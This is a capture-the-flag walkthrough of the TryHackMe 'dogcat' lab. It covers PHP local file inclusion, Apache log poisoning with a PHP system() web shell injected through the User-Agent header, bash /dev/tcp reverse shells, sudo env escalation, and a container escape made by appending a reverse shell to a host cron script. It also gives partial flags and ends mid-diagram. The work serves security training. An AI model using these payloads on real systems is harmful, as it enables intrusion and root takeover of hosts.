# TryHackMe: dogcat

A concise walkthrough of the TryHackMe **dogcat** machine, focusing on why each vulnerability works and how the attack chain progresses.

## Overview

**Difficulty:** Medium
**Platform:** Linux + Docker
**Vulnerabilities:**

* Local File Inclusion (LFI)
* Apache Log Poisoning
* Sudo Misconfiguration
* Docker/Container Escape
* Cronjob Misconfiguration

**Attack Chain:**

```text
LFI → Log Poisoning → RCE → www-data
→ sudo env → Container Root
→ Writable Host Script → Host Root
```

---

## 1. Reconnaissance

Scan the target:

```bash
nmap -sC -sV <TARGET_IP>
```

Open ports:

```text
22/tcp  SSH
80/tcp  HTTP Apache httpd 2.4.38 ((Debian))
```

The web application is PHP-based and uses PHP's `include()` functionality to load files based on the `view` parameter.

Example:

```text
http://<TARGET_IP>/?view=dog
```

The application expects `dog` or `cat` in the filename and normally appends `.php`.

---

## 2. Local File Inclusion

The filename can be manipulated using directory traversal:

```text
dog/../../../../etc/passwd
```

The `ext` parameter can be used to prevent the application from adding `.php`:

```text
http://<TARGET_IP>/?view=dog/../../../../etc/passwd&ext=
```

### Why it works

The application effectively builds a file path from user-controlled input:

```text
include(view + extension)
```

Because the input is not properly restricted, `../` allows us to escape the intended directory and include arbitrary files.

---

## 3. LFI to RCE: Apache Log Poisoning

LFI can be converted into code execution by poisoning the Apache access log.

Inject PHP into the `User-Agent` header:

```bash
curl -H 'User-Agent: <?php system($_GET["cmd"]); ?>' http://<TARGET_IP>/
```

Then include the log:

```text
http://<TARGET_IP>/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=id
```

### Why it works

Apache stores the `User-Agent` value in `access.log`.

When the PHP application includes this log through LFI, PHP interprets the injected PHP code and executes it.

This gives command execution as `www-data`.

Flag 1:

```bash
http://10.49.131.29/?view=php://filter/convert.base64-encode/resource=cat../../../../../../../../../var/www/html/flag
```

Flag 2:

```burp
GET /?view=cat../../../../../../../../../../../../../var/www/flag2_QMW7JvaY2LvK.txt&ext= 
```

A reverse shell can be used for easier enumeration:

```bash
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
```

## 5. Container Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

The `www-data` user can execute `/usr/bin/env` as root without a password.

Spawn a root shell:

```bash
sudo env /bin/sh
```

Verify:

```bash
id
```

You should now be root **inside the container**.

Read:

```bash
cat /root/flag3.txt
```

Flag 3:

```text
THM{D1ff3r3nt_3*}
```

---

## 6. Container Escape

Inspect the backup directory:

```bash
ls -la /opt/backups/
```

The directory is shared with the host, and `backup.sh` is executed periodically by a host cronjob.

Because the container can modify the script, add a reverse shell:

```bash
echo 'bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1' >> /opt/backups/backup.sh
```

Start a listener:

```bash
nc -lvnp 5555
```

When the host cronjob executes the modified script, the connection returns as **host root**.

Read the final flag:

```bash
cat /root/flag4.txt
```

Flag 4:

```text
THM{esc4l4tions_on_esc4l4tions_on_*}
```

---

## Key Takeaways

1. **PHP `include()` + user-controlled file path → LFI**
2. **LFI + writable/readable Apache log → Log Poisoning → RCE**
3. **Weak sudo rule → Container Root**
4. **Writable host-mounted script + host cronjob → Host Root**

### Attack Chain

```text
PHP include()
     ↓
```
